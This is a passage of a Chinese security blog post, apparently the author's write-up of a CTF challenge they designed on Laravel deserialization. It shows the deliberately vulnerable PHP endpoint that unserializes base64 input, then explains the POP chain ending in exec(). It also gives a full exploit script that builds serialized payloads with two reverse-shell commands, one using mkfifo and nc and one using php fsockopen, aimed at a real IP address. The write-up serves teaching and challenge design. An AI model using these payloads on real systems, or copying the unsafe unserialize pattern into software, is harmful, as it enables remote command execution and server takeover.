class="line"><span class="variable">$encrypter</span> = <span class="variable">$app</span>-&gt;<span class="title function_ invoke__">make</span>(<span class="string">&#x27;encrypter&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="variable">$encrypter</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$role</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$decrypted</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$role_value</span> = <span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$role_value</span> = <span class="variable">$decrypted</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无权限访问(解密失败: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role_value</span> !== <span class="string">&#x27;admin260117&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无权限访问&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>] ?? <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>, <span class="string">&#x27;payload=&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$payload</span>) &amp;&amp; <span class="variable">$payload</span> !== <span class="string">&quot;Welcome Admin! Please provide your payload.&quot;</span>) &#123; <span class="comment">// 防止空提交被误处理</span></span><br><span class="line">    <span class="comment">// Suppress errors and unserialize</span></span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Deserialization triggered.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome Admin! Please provide your payload.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析 POP 链调用过程：</p>
+<ul>
+<li><code>User::__destruct()</code> 触发 <code>$this-&gt;profile-&gt;show()</code></li>
+<li>由于 <code>Profile</code> 类没有 <code>show()</code> 方法，触发 <code>Profile::__call()</code></li>
+<li><code>Profile::__call()</code> 将 <code>$this-&gt;db</code> 作为函数调用：<code>$func()</code></li>
+<li>如果 <code>$this-&gt;db</code> 是 <code>Database</code> 对象，将其作为函数调用会触发 <code>Database::__invoke()</code></li>
+<li><code>Database::__invoke()</code> 执行 <code>echo $this-&gt;host</code></li>
+<li>如果 <code>$this-&gt;host</code> 是 <code>Command</code> 对象，将其作为字符串输出会触发 <code>Command::__toString()</code></li>
+<li><code>Command::__toString()</code> 中调用了 <code>exec($this-&gt;cmd)</code> 造成无回显命令执行</li>
+</ul>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Hidden</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 使用 Alpine 默认自带的 mkfifo 和 nc 反弹 ash (BusyBox sh)</span></span><br><span class="line"><span class="variable">$cmd_nc</span> = <span class="string">&quot;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 113.45.17.228 8989 &gt;/tmp/f&quot;</span>;</span><br><span class="line"><span class="variable">$c1</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"><span class="variable">$c1</span>-&gt;cmd = <span class="variable">$cmd_nc</span>;</span><br><span class="line"><span class="variable">$d1</span> = <span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line"><span class="variable">$d1</span>-&gt;host = <span class="variable">$c1</span>;</span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$p1</span>-&gt;db = <span class="variable">$d1</span>;</span><br><span class="line"><span class="variable">$u1</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u1</span>-&gt;profile = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用 PHP 原生 CLI 命令直接反弹</span></span><br><span class="line"><span class="variable">$cmd_php</span> = <span class="string">&quot;php -r &#x27;\$sock=fsockopen(\&quot;113.45.17.228\&quot;,8989);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"><span class="variable">$c2</span>-&gt;cmd = <span class="variable">$cmd_php</span>;</span><br><span class="line"><span class="variable">$d2</span> = <span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line"><span class="variable">$d2</span>-&gt;host = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$p2</span>-&gt;db = <span class="variable">$d2</span>;</span><br><span class="line"><span class="variable">$u2</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u2</span>-&gt;profile = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;--- Payload 1 (mkfifo + nc) ---\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$u1</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;--- Payload 2 (php-cli) ---\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$u2</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>最后也是成功 RCE</p>
+<p><img src="https://pic1.imgdb.cn/item/69f05d088e67748fa14ab209.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E5%87%BA%E9%A2%98/" title="出题" data-aos="zoom-in">出题</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag" title="任意文件读取">任意文件读取</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="反序列化">反序列化</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="知攻善防实验室 Linux 应急响应-1" class="lazyload">
+        <a href="/2026/04/11/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4%20Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-1/" aria-label="前一篇: 知攻善防实验室 Linux 应急响应-1" title="前一篇: 知攻善防实验室 Linux 应急响应-1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            知攻善防实验室 Linux 应急响应-1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="出题——静态网站怎么打" class="lazyload">
+      <a href="/2026/04/11/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E6%80%8E%E4%B9%88%E6%89%93/" aria-label="后一篇: 出题——静态网站怎么打"  title="后一篇: 出题——静态网站怎么打"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          出题——静态网站怎么打
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        61.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:17
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E2%80%94%E2%80%94%E8%BF%99%E5%85%B3%E9%9A%BE%E4%B8%8D%E5%80%92%E4%BD%A0%E7%AE%97%E7%82%B8%E5%8D%95"><span class="toc-number">1.</span> <span class="toc-text">出题——这关难不倒你算炸单</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ignition-execute-solution%EF%BC%88filter-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">&#x2F;_ignition&#x2F;execute-solution（filter + 双写绕过）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Laravel-Cookie-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">Laravel Cookie 伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-%E9%93%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">POP 链</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">61</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">114</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "出题——这关难不倒你算炸单",
+          url: "http://example.com/2026/04/11/%E8%BF%99%E5%85%B3%E9%9A%BE%E4%B8%8D%E5%80%92%E4%BD%A0%E7%AE%97%E7%82%B8%E5%8D%95/",
+          excerpt: "",
+          description: "",
+          stripContent: "出题——这关难不倒你算炸单前言这次出题参考采取任意文件读取漏洞 + Laravel 框架结合版，算是基于任意文件读取的最后一舞 本意让选手学会在不同复杂的场景下，利用任意文件读取漏洞扩大危害 Laravel 框架全球使用占比约 64%，另外两个则是 WordPress（25%）、Symfony（23%） Symfony 框架国内不用，WordPress 现成的靶机（VulnHub）也都有，所以采用 Laravel 框架出题 信息收集访问页面  观察 URL 发现该站点采用的路由模式，大概率使用的",
+          date: "Sat Apr 11 2026 02:39:00 GMT+0800",
+          updated: "Tue Apr 28 2026 15:09:39 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
